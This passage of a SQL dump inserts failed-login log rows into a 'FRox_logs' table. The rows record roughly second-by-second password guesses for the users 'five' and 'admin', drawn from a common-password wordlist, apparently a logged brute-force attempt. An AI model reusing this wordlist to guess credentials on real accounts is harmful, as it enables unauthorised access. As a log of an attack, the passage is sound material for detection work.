(240, 'WARNING_AUTH_NOT_SUCCESS', 'five, andrea, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516732),
(241, 'WARNING_AUTH_NOT_SUCCESS', 'five, asdasd, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516733),
(242, 'WARNING_AUTH_NOT_SUCCESS', 'five, asdfghjkl, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516734),
(243, 'WARNING_AUTH_NOT_SUCCESS', 'five, barcelona, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516735),
(244, 'WARNING_AUTH_NOT_SUCCESS', 'five, cecelle222, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516736),
(245, 'WARNING_AUTH_NOT_SUCCESS', 'five, changeme, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516737),
(246, 'WARNING_AUTH_NOT_SUCCESS', 'five, cl4.r0ut3r, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516737),
(247, 'WARNING_AUTH_NOT_SUCCESS', 'five, crs, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516738),
(248, 'WARNING_AUTH_NOT_SUCCESS', 'five, daniel, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516739),
(249, 'WARNING_AUTH_NOT_SUCCESS', 'five, demo, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516740),
(250, 'WARNING_AUTH_NOT_SUCCESS', 'five, gati07, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516741),
(251, 'WARNING_AUTH_NOT_SUCCESS', 'five, guest, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516742),
(252, 'WARNING_AUTH_NOT_SUCCESS', 'five, iamawesome, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516743),
(253, 'WARNING_AUTH_NOT_SUCCESS', 'five, iloveu1362, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516744),
(254, 'WARNING_AUTH_NOT_SUCCESS', 'five, iloveyou, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516745),
(255, 'WARNING_AUTH_NOT_SUCCESS', 'five, internet, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516746),
(256, 'WARNING_AUTH_NOT_SUCCESS', 'five, iz85917031, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516747),
(257, 'WARNING_AUTH_NOT_SUCCESS', 'five, jackmark456, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516748),
(258, 'WARNING_AUTH_NOT_SUCCESS', 'five, jimmy098, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516749),
(259, 'WARNING_AUTH_NOT_SUCCESS', 'five, jimmy123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516750),
(260, 'WARNING_AUTH_NOT_SUCCESS', 'five, justaddwater, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516750),
(261, 'WARNING_AUTH_NOT_SUCCESS', 'five, kbctyjr, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516751),
(262, 'WARNING_AUTH_NOT_SUCCESS', 'five, master, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516752),
(263, 'WARNING_AUTH_NOT_SUCCESS', 'five, michelle, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516753),
(264, 'WARNING_AUTH_NOT_SUCCESS', 'five, mpmstas,,11, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516754),
(265, 'WARNING_AUTH_NOT_SUCCESS', 'five, mustang, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516755),
(266, 'WARNING_AUTH_NOT_SUCCESS', 'five, oktober83, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516756),
(267, 'WARNING_AUTH_NOT_SUCCESS', 'five, omgponies, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516756),
(268, 'WARNING_AUTH_NOT_SUCCESS', 'five, parola, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516757),
(269, 'WARNING_AUTH_NOT_SUCCESS', 'five, pass, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516758),
(270, 'WARNING_AUTH_NOT_SUCCESS', 'five, password, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516759),
(271, 'WARNING_AUTH_NOT_SUCCESS', 'five, password1, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516760),
(272, 'WARNING_AUTH_NOT_SUCCESS', 'five, princess, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516761),
(273, 'WARNING_AUTH_NOT_SUCCESS', 'five, q1w2e3r4, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516762),
(274, 'WARNING_AUTH_NOT_SUCCESS', 'five, qazwsx, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516763),
(275, 'WARNING_AUTH_NOT_SUCCESS', 'five, qwerty, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516764),
(276, 'WARNING_AUTH_NOT_SUCCESS', 'five, qwerty123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516765),
(277, 'WARNING_AUTH_NOT_SUCCESS', 'five, qwertyuiop, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516765),
(278, 'WARNING_AUTH_NOT_SUCCESS', 'five, realbetis07, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516766),
(279, 'WARNING_AUTH_NOT_SUCCESS', 'five, root, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516767),
(280, 'WARNING_AUTH_NOT_SUCCESS', 'five, samsung, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516768),
(281, 'WARNING_AUTH_NOT_SUCCESS', 'five, sergio80, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516769),
(282, 'WARNING_AUTH_NOT_SUCCESS', 'five, shadow, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516770),
(283, 'WARNING_AUTH_NOT_SUCCESS', 'five, spoofyou2015, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516771),
(284, 'WARNING_AUTH_NOT_SUCCESS', 'five, student, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516772),
(285, 'WARNING_AUTH_NOT_SUCCESS', 'five, sunshine, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516772),
(286, 'WARNING_AUTH_NOT_SUCCESS', 'five, test, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516773),
(287, 'WARNING_AUTH_NOT_SUCCESS', 'five, ubnt, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516774),
(288, 'WARNING_AUTH_NOT_SUCCESS', 'five, user, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516775),
(289, 'WARNING_AUTH_NOT_SUCCESS', 'five, welcome, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516776),
(290, 'WARNING_AUTH_NOT_SUCCESS', 'five, welcome1, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516777),
(291, 'WARNING_AUTH_NOT_SUCCESS', 'five, zonnetje, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516778),
(292, 'WARNING_AUTH_NOT_SUCCESS', 'five, zxcvbnm, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516779),
(293, 'WARNING_AUTH_NOT_SUCCESS', 'admin, admin, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521946),
(294, 'WARNING_AUTH_NOT_SUCCESS', 'admin, football20, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521947),
(295, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ******, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521949),
(296, 'WARNING_AUTH_NOT_SUCCESS', 'admin, *******, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521950),
(297, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ********, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521952),
(298, 'WARNING_AUTH_NOT_SUCCESS', 'admin, *********, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521953),
(299, 'WARNING_AUTH_NOT_SUCCESS', 'admin, **********, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521954),
(300, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 0, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521956),
(301, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 0000, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521957),
(302, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 000000, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521959),
(303, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 00000000, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521960),
(304, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 0123456789, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521962),
(305, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 0987654321, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521963),
(306, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521965),
(307, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 102030, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521966),
(308, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1111, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521968),
(309, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 11111, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521969),
(310, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 111111, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521971),
(311, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 11111111, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521972),
(312, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 112233, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521973),
(313, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1128, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521975),
(314, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 121212, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521976),
(315, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521977),
(316, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521979),
(317, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123123123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521980),
(318, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123321, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521981);
INSERT INTO `FRox_logs` (`log_id`, `log_type`, `log_text`, `log_time`) VALUES
(319, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1234, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521983),
(320, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 12341234, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521984),
(321, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 12345, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521985),
(322, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123456, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521987),
(323, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1234567, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521988),
(324, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 12345678, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521989),
(325, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123456789, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521991),
(326, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1234567890, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521992),
(327, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1234qwer, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521994),
(328, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123654, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521995),
(329, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123abc, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521996),
(330, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123qwe, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521998),
(331, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 159357, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527521999),
(332, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 159753, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522001),
(333, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 19731973, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522002),
(334, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1q2w3e, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522004),
(335, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1q2w3e4r, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522005),
(336, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1q2w3e4r5t, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522006),
(337, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1qaz2wsx, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522008),
(338, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 222222, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522009),
(339, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 42Olympia, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522010),
(340, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 4uA7d0A1, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522012),
(341, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 4uA7d0B2, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522013),
(342, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 555555, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522015),
(343, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 654321, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522016),
(344, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 666666, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522017),
(345, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 777777, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522019),
(346, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 7777777, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522020),
(347, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 888888, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522021),
(348, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 88888888, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522023),
(349, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 8WI5Hlbww*Q%, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522024),
(350, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 97cCm#, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522026),
(351, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 987654, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522027),
(352, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 987654321, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522028),
(353, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 999999, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522030),
(354, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ??????, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522031),
(355, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ???????, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522032),
(356, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ????????, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522034),
(357, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ?????????, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522035),
(358, 'WARNING_AUTH_NOT_SUCCESS', 'admin, BALANDAS, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522036),
(359, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Cannot Decrypt, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522038),
(360, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Caroline123@, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522039),
(361, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Dr%*iKm, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522041),
(362, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Every1Out, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522042),
(363, 'WARNING_AUTH_NOT_SUCCESS', 'admin, FTpdo24#, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522043),
(364, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Ghj124$(), RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522045),
(365, 'WARNING_AUTH_NOT_SUCCESS', 'admin, HowMuchIsTheFish, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522046),
(366, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Hwa303859, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522048),
(367, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Karend22, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522049),
(368, 'WARNING_AUTH_NOT_SUCCESS', 'admin, LogMeIn, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522050),
(369, 'WARNING_AUTH_NOT_SUCCESS', 'admin, No Data!, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522052),
(370, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Note:, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522053),
(371, 'WARNING_AUTH_NOT_SUCCESS', 'admin, P@ssw0rd, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522054),
(372, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Password, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522056),
(373, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Password1, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522057),
(374, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Password123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522059),
(375, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Passwort, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522060),
(376, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Sakhie64, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522061),
(377, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Shamrock77, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522064),
